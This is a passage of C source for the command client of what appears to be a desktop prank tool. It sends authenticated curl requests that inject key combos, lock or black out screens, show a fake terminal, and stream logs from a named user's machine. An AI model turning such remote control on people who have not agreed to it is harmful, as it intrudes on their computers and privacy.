    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/showdesktop?id=%s", http_url, target_encoded);

    printf("Envoi de la commande showdesktop (Super+D) à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande showdesktop envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande showdesktop.\n");
        return 1;
    }
}

int send_key_command(const char *target_user, const char *combo) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    char combo_encoded[512];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded)) ||
        !url_encode_component(combo, combo_encoded, sizeof(combo_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/key?id=%s&combo=%s", http_url, target_encoded, combo_encoded);

    printf("Envoi du raccourci '%s' à %s...\n", combo, target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande key envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande key.\n");
        return 1;
    }
}

int send_reverse_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/reverse?id=%s", http_url, target_encoded);

    printf("Envoi de la commande reverse à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande reverse envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande reverse.\n");
        return 1;
    }
}

int send_uninstall_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    // Récupérer l'utilisateur courant qui fait la demande
    char *from_user = get_username();
    
    // Si target_user est NULL, désinstaller soi-même
    const char *actual_target = target_user ? target_user : from_user;

    char target_encoded[256];
    char output[4096] = {0};
    
    if (target_user) {
        printf("Envoi de la commande de désinstallation à %s...\n", actual_target);
    } else {
        printf("Désinstallation en cours...\n");
    }
    
    if (!url_encode_component(actual_target, target_encoded, sizeof(target_encoded))) {
        free(from_user);
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }

    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/uninstall?id=%s", http_url, target_encoded);

    free(from_user);

    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    if (run_execvp_capture(argv, output, sizeof(output)) < 0) {
        printf("Erreur lors de l'envoi de la commande.\n");
        return 1;
    }
    
    // Afficher la réponse du serveur
    if (strstr(output, "Forbidden") || strstr(output, "Unauthorized")) {
        printf("\n❌ %s", output);
        return 1;
    } else if (strstr(output, "sent to")) {
        printf("\n✅ %s", output);
        return 0;
    } else {
        printf("\n%s", output);
        return 0;
    }
}

int send_reinstall_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/reinstall?id=%s", http_url, target_encoded);

    printf("Envoi de la commande de réinstallation à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande reinstall envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande reinstall.\n");
        return 1;
    }
}

int send_marquee_command(const char *target_user, const char *url_or_file) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }

    int is_local_file = 0;

    // Vérifier si c'est un fichier local
    if (access(url_or_file, F_OK) == 0) {
        is_local_file = 1;
    }

    if (is_local_file) {
        printf("Upload du fichier %s pour marquee sur %s...\n", url_or_file, target_user);
        char form_arg[1536];
        char full_url[4096];
        snprintf(form_arg, sizeof(form_arg), "file=@%s", url_or_file);
        snprintf(full_url, sizeof(full_url), "%s/api/upload?id=%s&type=marquee", http_url, target_encoded);

        char auth_header[512] = {0};
        char *argv[12];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = "-F";
        argv[i++] = form_arg;
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande marquee envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande marquee.\n");
        return 1;
    } else {
        char url_encoded[1536];
        if (!url_encode_component(url_or_file, url_encoded, sizeof(url_encoded))) {
            printf("Erreur: URL invalide ou trop longue.\n");
            return 1;
        }

        printf("Envoi de la commande marquee à %s avec l'image %s...\n", target_user, url_or_file);
        char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/marquee?id=%s&url=%s", http_url, target_encoded, url_encoded);

        char auth_header[512] = {0};
        char *argv[8];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande marquee envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande marquee.\n");
        return 1;
    }
}

int send_cover_command(const char *target_user, const char *url_or_file) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    int is_local_file = 0;

    // Vérifier si c'est un fichier local
    if (access(url_or_file, F_OK) == 0) {
        is_local_file = 1;
    }

    if (is_local_file) {
        printf("Upload du fichier %s pour cover sur %s...\n", url_or_file, target_user);
        char form_arg[1536];
        char full_url[4096];
        snprintf(form_arg, sizeof(form_arg), "file=@%s", url_or_file);
        snprintf(full_url, sizeof(full_url), "%s/api/upload?id=%s&type=cover", http_url, target_encoded);

        char auth_header[512] = {0};
        char *argv[12];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = "-F";
        argv[i++] = form_arg;
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande cover envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande cover.\n");
        return 1;
    } else {
        char url_encoded[1536];
        if (!url_encode_component(url_or_file, url_encoded, sizeof(url_encoded))) {
            printf("Erreur: URL invalide ou trop longue.\n");
            return 1;
        }
        printf("Envoi de la commande cover à %s avec l'image %s...\n", target_user, url_or_file);
        char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/cover?id=%s&url=%s", http_url, target_encoded, url_encoded);

        char auth_header[512] = {0};
        char *argv[8];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande cover envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande cover.\n");
        return 1;
    }
}

int send_particles_command(const char *target_user, const char *url_or_file) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    int is_local_file = 0;

    // Vérifier si c'est un fichier local
    if (access(url_or_file, F_OK) == 0) {
        is_local_file = 1;
    }

    if (is_local_file) {
        printf("Upload du fichier %s pour particles sur %s...\n", url_or_file, target_user);
        char form_arg[1536];
        char full_url[4096];
        snprintf(form_arg, sizeof(form_arg), "file=@%s", url_or_file);
        snprintf(full_url, sizeof(full_url), "%s/api/upload?id=%s&type=particles", http_url, target_encoded);

        char auth_header[512] = {0};
        char *argv[12];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = "-F";
        argv[i++] = form_arg;
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande particles envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande particles.\n");
        return 1;
    } else {
        char url_encoded[1536];
        if (!url_encode_component(url_or_file, url_encoded, sizeof(url_encoded))) {
            printf("Erreur: URL invalide ou trop longue.\n");
            return 1;
        }
        printf("Envoi de la commande particles à %s avec l'image %s...\n", target_user, url_or_file);
        char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/particles?id=%s&url=%s", http_url, target_encoded, url_encoded);

        char auth_header[512] = {0};
        char *argv[8];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande particles envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi de la commande particles.\n");
        return 1;
    }
}

int send_clones_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/clones?id=%s", http_url, target_encoded);

    printf("Envoi de la commande clones à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande clones envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande clones.\n");
        return 1;
    }
}

int send_drunk_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/drunk?id=%s", http_url, target_encoded);

    printf("Envoi de la commande drunk à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande drunk envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande drunk.\n");
        return 1;
    }
}

int send_login_command(const char *user, const char *pass) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char output[4096] = {0};
    
    printf("Connexion en tant que '%s'...\n", user);
    
    char endpoint[1024];
    snprintf(endpoint, sizeof(endpoint), "%s/api/login", http_url);
    char user_arg[256];
    char pass_arg[256];
    snprintf(user_arg, sizeof(user_arg), "user=%s", user);
    snprintf(pass_arg, sizeof(pass_arg), "pass=%s", pass);

    char *argv[] = {
        "curl", "-s", "-X", "POST", endpoint,
        "--data-urlencode", user_arg,
        "--data-urlencode", pass_arg,
        NULL
    };

    if (run_execvp_capture(argv, output, sizeof(output)) < 0) {
        printf("Erreur lors de la connexion.\n");
        return 1;
    }
    
    // Parser la réponse JSON
    cJSON *json = cJSON_Parse(output);
    if (json) {
        cJSON *status = cJSON_GetObjectItemCaseSensitive(json, "status");
        cJSON *token = cJSON_GetObjectItemCaseSensitive(json, "token");
        
        if (cJSON_IsString(status) && strcmp(status->valuestring, "success") == 0 &&
            cJSON_IsString(token)) {
            // Sauvegarder le token admin
            strncpy(client_token, token->valuestring, sizeof(client_token) - 1);
            save_token_to_file(client_token);
            printf("\n✅ Connexion réussie ! Token admin sauvegardé.\n");
            printf("🔑 Token: %s\n", client_token);
            cJSON_Delete(json);
            return 0;
        }
        cJSON_Delete(json);
    }
    
    printf("\n❌ Échec de connexion: %s\n", output);
    return 1;
}

// Callback pour la connexion admin des logs
static void logs_fn(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_OPEN) {
        // Connexion TCP ouverte
    } else if (ev == MG_EV_CONNECT) {
        if (c->is_tls) {
            struct mg_tls_opts opts = {
                .name = mg_str(get_ws_url_remote() + 6)
            };
            mg_tls_init(c, &opts);
        }
    } else if (ev == MG_EV_WS_OPEN) {
        printf("Connexion WebSocket établie pour les logs.\n");
        
        // 1. S'authentifier en tant qu'admin
        cJSON *auth = cJSON_CreateObject();
        cJSON_AddStringToObject(auth, "type", "auth_admin");
        cJSON_AddStringToObject(auth, "token", manual_token ? manual_token : client_token);
        char *auth_str = cJSON_PrintUnformatted(auth);
        mg_ws_send(c, auth_str, strlen(auth_str), WEBSOCKET_OP_TEXT);
        free(auth_str);
        cJSON_Delete(auth);
        
        // 2. S'abonner aux logs de la cible
        const char *target = (const char *)c->fn_data;
        cJSON *sub = cJSON_CreateObject();
        cJSON_AddStringToObject(sub, "type", "subscribe");
        cJSON_AddStringToObject(sub, "target", target);
        char *sub_str = cJSON_PrintUnformatted(sub);
        mg_ws_send(c, sub_str, strlen(sub_str), WEBSOCKET_OP_TEXT);
        free(sub_str);
        cJSON_Delete(sub);
        
        printf("Abonnement aux logs de %s envoyé...\n", target);
        printf("En attente de logs (Ctrl+C pour quitter)...\n\n");
        
    } else if (ev == MG_EV_WS_MSG) {
        struct mg_ws_message *wm = (struct mg_ws_message *) ev_data;
        // Parser le message JSON pour extraire le contenu du log
        cJSON *json = cJSON_ParseWithLength(wm->data.buf, wm->data.len);
        if (json) {
            cJSON *type = cJSON_GetObjectItemCaseSensitive(json, "type");
            cJSON *data = cJSON_GetObjectItemCaseSensitive(json, "data");
            
            if (cJSON_IsString(type) && strcmp(type->valuestring, "log") == 0 && cJSON_IsString(data)) {
                printf("%s", data->valuestring);
                fflush(stdout);
            }
            cJSON_Delete(json);
        }
    } else if (ev == MG_EV_CLOSE) {
        printf("Connexion logs fermée.\n");
    } else if (ev == MG_EV_ERROR) {
        printf("Erreur logs: %s\n", (char *)ev_data);
    }
}

int watch_logs(const char *target_user) {
    // Initialiser un nouveau manager pour cette connexion dédiée
    struct mg_mgr log_mgr;
    mg_mgr_init(&log_mgr);
    
    char *username = get_username();
    char url[1024];
    const char *ws_url = get_ws_url();
    // On se connecte avec un ID temporaire "admin-watcher"
    if (ws_client_secret[0] == '\0') {
        const char *env_secret = getenv("WALLCHANGE_CLIENT_SECRET");
        if (env_secret && env_secret[0] != '\0') {
            strncpy(ws_client_secret, env_secret, sizeof(ws_client_secret) - 1);
            ws_client_secret[sizeof(ws_client_secret) - 1] = '\0';
        }
    }

    if (ws_client_secret[0] != '\0') {
        char secret_encoded[512];
        if (url_encode_component(ws_client_secret, secret_encoded, sizeof(secret_encoded))) {
            snprintf(url, sizeof(url), "%s/admin-watcher-%d?auth=%s", ws_url, getpid(), secret_encoded);
        } else {
            snprintf(url, sizeof(url), "%s/admin-watcher-%d", ws_url, getpid());
        }
    } else {
        snprintf(url, sizeof(url), "%s/admin-watcher-%d", ws_url, getpid());
    }
    free(username);

    printf("Connexion au serveur pour voir les logs de %s...\n", target_user);
    
    // Passer target_user comme fn_data
    mg_ws_connect(&log_mgr, url, logs_fn, (void*)target_user, NULL);
    
    // Boucle infinie jusqu'à interruption
    while (1) {
        mg_mgr_poll(&log_mgr, 100);
    }
    
    mg_mgr_free(&log_mgr);
    return 0;
}

int send_faketerminal_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/faketerminal?id=%s", http_url, target_encoded);

    printf("Envoi de la commande faketerminal à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande faketerminal envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande faketerminal.\n");
        return 1;
    }
}

int send_confetti_command(const char *target_user, const char *url) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }

    printf("Envoi de la commande confetti à %s...\n", target_user);
    
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));

    if (url) {
        char url_encoded[1536];
        if (!url_encode_component(url, url_encoded, sizeof(url_encoded))) {
            printf("Erreur: URL invalide ou trop longue.\n");
            return 1;
        }
        static char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/confetti?id=%s&url=%s", http_url, target_encoded, url_encoded);
        argv[i++] = full_url;
    } else {
        static char full_url[2048];
        snprintf(full_url, sizeof(full_url), "%s/api/confetti?id=%s", http_url, target_encoded);
        argv[i++] = full_url;
    }
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande confetti envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande confetti.\n");
        return 1;
    }
}

int send_spotlight_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/spotlight?id=%s", http_url, target_encoded);

    printf("Envoi de la commande spotlight à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande spotlight envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande spotlight.\n");
        return 1;
    }
}



int send_textscreen_command(const char *target_user, const char *text) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    printf("Envoi de la commande textscreen à %s...\n", target_user);
    
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));

    if (text) {
        char text_encoded[1536];
        if (!url_encode_component(text, text_encoded, sizeof(text_encoded))) {
            printf("Erreur: texte invalide ou trop long.\n");
            return 1;
        }
        static char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/textscreen?id=%s&text=%s", http_url, target_encoded, text_encoded);
        argv[i++] = full_url;
    } else {
        static char full_url[2048];
        snprintf(full_url, sizeof(full_url), "%s/api/textscreen?id=%s", http_url, target_encoded);
        argv[i++] = full_url;
    }
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande textscreen envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande textscreen.\n");
        return 1;
    }
}

int send_wavescreen_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/wavescreen?id=%s", http_url, target_encoded);

    printf("Envoi de la commande wavescreen à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande wavescreen envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande wavescreen.\n");
        return 1;
    }
}

int send_dvdbounce_command(const char *target_user, const char *url) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }

    printf("Envoi de la commande dvdbounce à %s...\n", target_user);
    
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));

    if (url) {
        char url_encoded[1536];
        if (!url_encode_component(url, url_encoded, sizeof(url_encoded))) {
            printf("Erreur: URL invalide ou trop longue.\n");
            return 1;
        }
        static char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/dvdbounce?id=%s&url=%s", http_url, target_encoded, url_encoded);
        argv[i++] = full_url;
    } else {
        static char full_url[2048];
        snprintf(full_url, sizeof(full_url), "%s/api/dvdbounce?id=%s", http_url, target_encoded);
        argv[i++] = full_url;
    }
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande dvdbounce envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande dvdbounce.\n");
        return 1;
    }
}

int send_fireworks_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/fireworks?id=%s", http_url, target_encoded);

    printf("Envoi de la commande fireworks à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande fireworks envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande fireworks.\n");
        return 1;
    }
}

int send_lock_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/lock?id=%s", http_url, target_encoded);

    printf("Envoi de la commande lock à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande lock envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande lock.\n");
        return 1;
    }
}

int send_blackout_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/blackout?id=%s", http_url, target_encoded);

    printf("Envoi de la commande blackout à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande blackout envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande blackout.\n");
        return 1;
    }
}
